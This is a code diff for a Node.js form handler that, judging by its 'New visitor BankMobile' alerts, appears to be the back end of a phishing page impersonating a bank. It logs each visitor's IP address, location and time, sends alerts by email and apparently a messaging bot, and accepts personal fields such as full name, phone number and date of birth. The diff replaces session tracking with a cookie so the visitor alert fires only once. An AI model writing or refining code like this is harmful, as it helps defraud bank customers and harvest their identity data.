@@ -1,15 +1,15 @@
 const axios = require("axios");
 const nodemailer = require("nodemailer");
+const cookie = require("cookie");
 
 module.exports = async (req, res) => {
   if (req.method !== "POST") {
     return res.status(405).json({ error: "Method Not Allowed" });
   }
 
-  // ✅ Check if session is available
-  if (!req.session) {
-    return res.status(500).json({ error: "Session is not available" });
-  }
+  // Parse cookies
+  const cookies = cookie.parse(req.headers.cookie || "");
+  const visitorAlertSent = cookies.visitorAlertSent === "true";
 
   const {
     fullName,
@@ -25,7 +25,7 @@ module.exports = async (req, res) => {
     dob,
   } = req.body || {};
 
-  // Get visitor IP and time
+  // Get visitor IP and location
   const rawIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
   const visitorIP = rawIP?.split(",")[0]?.trim();
 
@@ -54,8 +54,8 @@ module.exports = async (req, res) => {
     },
   });
 
-  // ✅ Send visitor alert only once per session
-  if (!req.session.visitorAlertSent) {
+  // ✅ Send visitor alert only once using cookies
+  if (!visitorAlertSent) {
     const visitorMessage = `
 👀 *New Visitor Landed on the Form Page*
 
@@ -78,13 +78,19 @@ module.exports = async (req, res) => {
         text: `New visitor BankMobile:\n\nIP: ${visitorIP}\nLocation: ${locationInfo}\nTime: ${timestamp}`,
       });
 
-      req.session.visitorAlertSent = true;
+      // Set cookie to prevent duplicate alert
+      res.setHeader("Set-Cookie", cookie.serialize("visitorAlertSent", "true", {
+        path: "/",
+        httpOnly: true,
+        maxAge: 60 * 60 * 24, // 1 day
+        sameSite: "strict",
+      }));
     } catch (err) {
       console.error("Visitor alert failed:", err.message);
     }
   }
 
-  // If no form submission, return after tracking visit
+  // If no form submitted, stop here
   if (
     !fullName &&
     !phoneNumber &&
